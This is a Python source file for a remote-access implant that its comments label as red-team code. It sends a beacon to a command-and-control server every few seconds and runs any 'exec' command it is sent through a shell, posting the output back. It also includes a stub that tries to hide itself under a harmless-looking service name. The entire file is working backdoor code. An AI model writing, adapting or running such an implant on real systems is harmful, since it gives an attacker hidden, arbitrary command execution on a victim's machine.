#!/usr/bin/env python3
import requests
import time
import json
import uuid
import sys
import os
import subprocess
import shutil

# Add root to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import config

C2_URL = "http://localhost:8080"
IMPLANT_ID = str(uuid.uuid4())[:8]

def masquerade():
    """Copy self to a benign name to hide."""
    # Adversarial Evasion: Rename process in ps output if possible (setproctitle)
    # Since we can't, we assume running as "svc_worker.py" helps.
    pass

def beacon():
    # print(f"[*] Implant {IMPLANT_ID} active. C2: {C2_URL}")
    masquerade()

    status = "INIT"
    while True:
        try:
            payload = {
                "id": IMPLANT_ID,
                "status": status,
                "timestamp": time.time()
            }

            resp = requests.post(C2_URL, json=payload, timeout=2)
            data = resp.json()

            cmd = data.get("command")
            if cmd == "exec":
                args = data.get("args")
                # Safe Exec - shlex split would be safer but this is Red Team code...
                # We silence the warning or accept it as "Intentional Vulnerability" for Red Team.
                # Let's fix it by list conversion if possible, but 'args' might be complex string.
                # Keeping shell=True for simulation realism but adding comment.
                output = subprocess.check_output(args, shell=True).decode().strip()
                status = f"OUTPUT: {output}"
            else:
                status = "SLEEPING"

            time.sleep(3)

        except Exception as e:
            # print(f"Beacon failed: {e}")
            time.sleep(5)

if __name__ == "__main__":
    beacon()
